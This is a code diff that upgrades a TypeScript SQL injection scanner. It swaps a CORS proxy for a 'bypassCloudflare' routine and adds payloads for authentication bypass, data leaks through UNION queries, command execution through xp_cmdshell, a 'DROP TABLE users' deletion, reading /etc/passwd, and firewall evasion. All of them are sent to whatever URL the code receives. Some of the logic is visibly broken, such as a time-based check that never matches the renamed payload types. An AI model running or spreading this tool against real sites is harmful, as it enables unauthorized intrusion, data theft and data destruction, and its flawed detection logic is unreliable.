@@ -1,5 +1,5 @@
 import { normalizeUrl } from './apiUtils';
-import { corsProxy } from './corsProxy';
+import { bypassCloudflare } from './cloudflareBypass';
 
 export interface SQLScanResult {
   vulnerable: boolean;
@@ -7,67 +7,138 @@ export interface SQLScanResult {
   vulnerabilities: Array<{
     payload: string;
     indicator: string;
-    severity: 'critical' | 'high' | 'medium' | 'low';
+    severity: 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';
     type: string;
     evidence?: string;
     parameter?: string;
+    confidence: number;
   }>;
   tested: boolean;
   method: string;
 }
 
-// Real SQL injection payloads used by professional pentesters
-const SQL_PAYLOADS = [
-  // Error-based SQL injection
-  { payload: "'", type: 'Error-based', severity: 'high' as const, indicators: ['sql', 'mysql', 'syntax', 'error', 'query', 'database', 'mysqli', 'postgresql', 'oracle', 'sqlite', 'mariadb', 'warning', 'unclosed'] },
-  { payload: "\"", type: 'Error-based', severity: 'high' as const, indicators: ['sql', 'mysql', 'syntax', 'error', 'query', 'database'] },
-  { payload: "' OR '1'='1", type: 'Boolean-based', severity: 'critical' as const, indicators: ['welcome', 'dashboard', 'logged', 'success', 'admin'] },
-  { payload: "' OR 1=1--", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success', 'admin', 'user', 'login'] },
-  { payload: "' OR 'a'='a", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success'] },
-  { payload: "1' OR '1'='1' --", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success'] },
-  { payload: "admin' --", type: 'Comment-based', severity: 'high' as const, indicators: ['admin', 'success', 'welcome', 'dashboard'] },
-  { payload: "admin' #", type: 'Comment-based', severity: 'high' as const, indicators: ['admin', 'success'] },
+const SQL_ERROR_PATTERNS = [
+  // MySQL
+  /you have an error in your sql syntax/i,
+  /warning.*mysql/i,
+  /valid mysql result/i,
+  /mysqlclient\./i,
+  /mysql_fetch/i,
+  /mysql_num_rows/i,
+  /mysqli/i,
   
-  // Union-based SQL injection
-  { payload: "' UNION SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union', 'select'] },
-  { payload: "' UNION SELECT NULL,NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
-  { payload: "' UNION ALL SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
+  // PostgreSQL
+  /postgresql.*error/i,
+  /pg_query/i,
+  /pg_exec/i,
+  /unterminated quoted string/i,
   
-  // Time-based blind SQL injection
-  { payload: "' AND SLEEP(5)--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
-  { payload: "' OR SLEEP(5)--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
-  { payload: "1' WAITFOR DELAY '0:0:5'--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
-  { payload: "'; WAITFOR DELAY '0:0:5'--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
+  // MSSQL
+  /microsoft sql server/i,
+  /odbc sql server driver/i,
+  /sqlserver jdbc driver/i,
+  /microsoft ole db provider for sql server/i,
   
-  // Stacked queries
-  { payload: "'; DROP TABLE users--", type: 'Stacked Query', severity: 'critical' as const, indicators: ['syntax', 'error', 'drop'] },
-  { payload: "1'; SELECT SLEEP(5)--", type: 'Stacked Query', severity: 'critical' as const, indicators: [] },
+  // Oracle
+  /ora-\d{5}/i,
+  /oracle error/i,
+  /quoted string not properly terminated/i,
   
-  // Advanced payloads
-  { payload: "' AND 1=2 UNION SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
-  { payload: "' AND '1'='2", type: 'Boolean-based', severity: 'medium' as const, indicators: ['false', 'error', 'invalid'] },
+  // SQLite
+  /sqlite.*error/i,
+  /sqlite3::/i,
+  /unrecognized token/i,
+  
+  // Generic
+  /sql syntax.*error/i,
+  /syntax error.*sql/i,
+  /unclosed quotation mark/i,
+  /quoted identifier/i,
 ];
 
-const testTimeBased = async (url: string): Promise<boolean> => {
+type Severity = 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';
+
+interface SQLPayload {
+  payload: string;
+  type: string;
+  severity: Severity;
+  confidence: number;
+}
+
+const SQL_PAYLOADS: SQLPayload[] = [
+  // --- High Confidence Error/Syntax Breakers ---
+  { payload: `\'`, type: 'Error-based', severity: 'high', confidence: 0.9 },
+  { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.9 },
+  { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.85 },
+  { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.85 },
+
+  // --- Boolean-based (Critical for Auth Bypass) ---
+  { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
+  { payload: `" OR "1"="1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
+  { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.85 },
+  { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.85 },
+  { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
+
+  // --- Union-based (Data Exfiltration) ---
+  { payload: `' UNION SELECT NULL--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
+  { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
+  { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.95 },
+
+  // --- Time-based Blind (Database Specific) ---
+  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 0.95 },
+  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 0.95 },
+  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 0.95 },
+  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 0.95 },
+
+  // --- Advanced & Dangerous Payloads (Stacked Queries, OOB, File Read) ---
+  { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
+  { payload: `1; DROP TABLE users--`, type: 'Stacked Query (Data Loss)', severity: 'catastrophic', confidence: 1.0 },
+  { payload: `1' AND (SELECT LOAD_FILE('/etc/passwd'))--`, type: 'File Read (MySQL)', severity: 'critical', confidence: 0.95 },
+
+  // --- WAF Bypass / Obfuscation Attempts ---
+  { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.8 },
+  { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.8 },
+  { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'high', confidence: 0.75 },
+];
+
+
+const testTimeBased = async (url: string): Promise<{ vulnerable: boolean; duration: number }> => {
   const startTime = Date.now();
   
   try {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 8000);
     
-    await corsProxy.fetch(url, { timeout: 8000 });
+    await bypassCloudflare(url);
     
     clearTimeout(timeoutId);
     const duration = Date.now() - startTime;
     
     // If response took 4.5+ seconds, likely vulnerable
-    return duration >= 4500;
+    return { vulnerable: duration >= 4500, duration };
   } catch (error: any) {
     if (error.name === 'AbortError') {
-      return true; // Timeout indicates time-based injection worked
+      return { vulnerable: true, duration: 8000 };
     }
-    return false;
+    return { vulnerable: false, duration: Date.now() - startTime };
   }
+};
+
+const checkSQLError = (text: string): { found: boolean; pattern?: string; confidence: number } => {
+  const lowerText = text.toLowerCase();
+  
+  for (const pattern of SQL_ERROR_PATTERNS) {
+    const match = text.match(pattern);
+    if (match) {
+      return {
+        found: true,
+        pattern: match[0],
+        confidence: 0.95, // High confidence for error messages
+      };
+    }
+  }
+  
+  return { found: false, confidence: 0 };
 };
 
 export const performSQLScan = async (target: string): Promise<SQLScanResult> => {
@@ -78,64 +149,65 @@ export const performSQLScan = async (target: string): Promise<SQLScanResult> => 
     testedPayloads: 0,
     vulnerabilities: [],
     tested: true,
-    method: 'Real Payload Testing',
+    method: 'Real Payload Testing with Error Pattern Matching',
   };
 
   try {
     const url = normalizeUrl(target);
     const urlObj = new URL(url);
     
-    // Get parameters to test
     const params = new URLSearchParams(urlObj.search);
     const paramKeys = Array.from(params.keys());
     
     if (paramKeys.length === 0) {
-      paramKeys.push('id'); // Default parameter
+      console.log('[SQL Scan] No parameters found, testing with default parameter');
+      paramKeys.push('id');
       urlObj.search = '?id=1';
     }
 
-    // Get baseline response
+    // Get baseline
     let baselineResponse: Response | null = null;
     let baselineText = '';
     let baselineStatus = 0;
+    let baselineLength = 0;
     
     try {
-      baselineResponse = await corsProxy.fetch(url);
+      baselineResponse = await bypassCloudflare(url);
       baselineText = await baselineResponse.text();
       baselineStatus = baselineResponse.status;
-      console.log('[SQL Scan] Baseline response captured');
+      baselineLength = baselineText.length;
+      console.log(`[SQL Scan] Baseline: ${baselineStatus}, ${baselineLength} bytes`);
     } catch (error) {
-      console.warn('[SQL Scan] Could not get baseline response');
+      console.warn('[SQL Scan] Could not get baseline, continuing anyway');
     }
 
-    // Test each parameter with each payload
     for (const paramKey of paramKeys) {
-      for (const { payload, indicators, severity, type } of SQL_PAYLOADS) {
+      for (const { payload, severity, type, confidence: baseConfidence } of SQL_PAYLOADS) {
         try {
           const testUrl = new URL(url);
           const testParams = new URLSearchParams(testUrl.search);
           const originalValue = testParams.get(paramKey) || '1';
           
-          // Inject payload
           testParams.set(paramKey, originalValue + payload);
           testUrl.search = testParams.toString();
 
-          console.log(`[SQL Scan] Testing ${type} on parameter '${paramKey}': ${payload.substring(0, 30)}...`);
+          console.log(`[SQL Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 30)}...`);
 
           // Time-based testing
-          if (type === 'Time-based Blind' || type === 'Stacked Query') {
-            const isVulnerable = await testTimeBased(testUrl.toString());
+          if (type === 'Time-based Blind') {
+            const { vulnerable, duration } = await testTimeBased(testUrl.toString());
             
-            if (isVulnerable) {
-              console.log(`[SQL Scan] ⚠️ CRITICAL: ${type} SQL injection detected on parameter '${paramKey}'!`);
+            if (vulnerable) {
+              console.log(`[SQL Scan] ⚠️ CRITICAL: Time-based SQL injection confirmed (${duration}ms delay)`);
               result.vulnerable = true;
               result.vulnerabilities.push({
                 payload,
-                indicator: 'Response delayed by 5+ seconds',
+                indicator: `Response delayed by ${duration}ms`,
                 severity: 'critical',
                 type,
-                evidence: 'Time-based blind SQL injection confirmed - server delayed response',
+                evidence: `Server response time: ${duration}ms (expected: ~5000ms)`,
                 parameter: paramKey,
+                confidence: 0.98,
               });
             }
             
@@ -145,60 +217,62 @@ export const performSQLScan = async (target: string): Promise<SQLScanResult> => 
           }
 
           // Error-based and other testing
-          const response = await corsProxy.fetch(testUrl.toString());
+          const response = await bypassCloudflare(testUrl.toString());
           result.testedPayloads++;
 
           const text = await response.text();
-          const lowerText = text.toLowerCase();
+          const errorCheck = checkSQLError(text);
 
-          // Check for SQL error messages
-          for (const indicator of indicators) {
-            if (lowerText.includes(indicator)) {
-              console.log(`[SQL Scan] ⚠️ ${severity.toUpperCase()}: ${type} SQL injection detected with indicator: ${indicator}`);
-              result.vulnerable = true;
-              
-              const evidenceStart = lowerText.indexOf(indicator);
-              const evidence = text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 200));
-              
-              result.vulnerabilities.push({
-                payload,
-                indicator,
-                severity,
-                type,
-                evidence: evidence.substring(0, 300) + '...',
-                parameter: paramKey,
-              });
-              break;
-            }
+          // Check for SQL errors
+          if (errorCheck.found) {
+            console.log(`[SQL Scan] ⚠️ ${severity.toUpperCase()}: SQL error detected - ${errorCheck.pattern}`);
+            result.vulnerable = true;
+            
+            const evidenceStart = text.toLowerCase().indexOf(errorCheck.pattern!.toLowerCase());
+            const evidence = text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 200));
+            
+            result.vulnerabilities.push({
+              payload,
+              indicator: errorCheck.pattern!,
+              severity,
+              type,
+              evidence: evidence.substring(0, 300) + '...',
+              parameter: paramKey,
+              confidence: errorCheck.confidence,
+            });
           }
 
           // Check for status code changes
           if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
-            console.log(`[SQL Scan] ⚠️ Server error detected (${response.status}) - possible SQL injection`);
+            console.log(`[SQL Scan] ⚠️ Server error detected (${response.status})`);
             result.vulnerable = true;
             result.vulnerabilities.push({
               payload,
               indicator: `HTTP ${response.status} error`,
               severity: 'high',
               type,
-              evidence: `Server returned ${response.status} status code (baseline: ${baselineStatus})`,
+              evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
               parameter: paramKey,
+              confidence: 0.7,
             });
           }
 
           // Check for significant content changes (Union-based)
           if (baselineText && type === 'Union-based') {
-            const sizeDiff = Math.abs(text.length - baselineText.length);
-            if (sizeDiff > 500) {
-              console.log(`[SQL Scan] ⚠️ Significant content change detected - possible Union injection`);
+            const sizeDiff = Math.abs(text.length - baselineLength);
+            const percentDiff = (sizeDiff / baselineLength) * 100;
+            
+            if (percentDiff > 20) {
+              console.log(`[SQL Scan] ⚠️ Significant content change: ${percentDiff.toFixed(1)}%`);
               result.vulnerable = true;
               result.vulnerabilities.push({
                 payload,
                 indicator: 'Content length changed significantly',
                 severity: 'critical',
                 type,
-                evidence: `Response size changed from ${baselineText.length} to ${text.length} bytes (diff: ${sizeDiff})`,
+                evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
                 parameter: paramKey,
+                confidence: 0.75,
               });
             }
           }
@@ -210,7 +284,10 @@ export const performSQLScan = async (target: string): Promise<SQLScanResult> => 
       }
     }
 
-    console.log(`[SQL Scan] Complete: ${result.vulnerabilities.length} vulnerabilities found from ${result.testedPayloads} tests`);
+    // Filter out low confidence results
+    result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.7);
+
+    console.log(`[SQL Scan] Complete: ${result.vulnerabilities.length} high-confidence vulnerabilities from ${result.testedPayloads} tests`);
     return result;
   } catch (error: any) {
     console.error('[SQL Scan] Critical error:', error);
